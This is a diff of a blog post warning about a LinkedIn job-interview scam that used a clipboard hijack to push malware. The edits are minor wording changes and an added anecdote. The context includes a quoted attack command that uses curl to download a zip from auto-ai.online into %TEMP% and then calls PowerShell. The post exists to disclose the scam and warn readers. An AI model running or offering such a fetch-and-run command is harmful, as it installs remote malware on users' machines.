@@ -7,9 +7,9 @@ summary: 'This is the story of a sophisticated job interview scam that happened 
 authors: ['default']
 ---
 
-This is the story of a sophisticated job interview scam that happened to me on LinkedIn using social engineering and a heavily obfuscated clipboard hijacking to push a malicious payload.
+This is the story of a sophisticated job interview scam that happened to me on LinkedIn using social engineering and an obfuscated clipboard hijacking to push a malicious payload.
 
-I spotted the scam pretty quickly and tried to schedule a phone call or video interview to see how far this scam goes but aside from a LinkedIn conversation (which honestly could have been with an LLM) couldn't directly get in touch with the scammers. I am sharing this to serve as a warning and provide ways you can protect yourselves as AI tooling makes attacks such as this further possible to bad actors online.
+I spotted the scam pretty quickly and tried to schedule a phone call or video interview to see how far this scam goes but aside from a LinkedIn conversation couldn't directly get in touch with the scammers. I am sharing this to serve as a warning and provide ways you can protect yourselves as AI tooling makes attacks such as this further possible to bad actors online.
 
 I have written the story in the section below, but if you just want to see the technical details of the attack then scroll down to [Technical Details](#technical-details).
 
@@ -85,6 +85,13 @@ curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" && powershe
 Now that my friends, looks sus af 🚨.
 
 That's the scam. A clipboard hijack to "fix your drivers" which would download a zipped payload from a remote server auto-ai.online and run on your machine.
+
+After that I tried to get him to connect a couple of times for a friendly chat but apparently our aspiring scammer only wants to
+DM and not meet IRL. I feel be a bit rejected!
+
+![message](/static/images/aftab-9.png)
+![message](/static/images/aftab-8.png)
+
 
 If you want to get into the weeds of what the actual attack might be, then read on below in the [Technical Details](#technical-details).
 
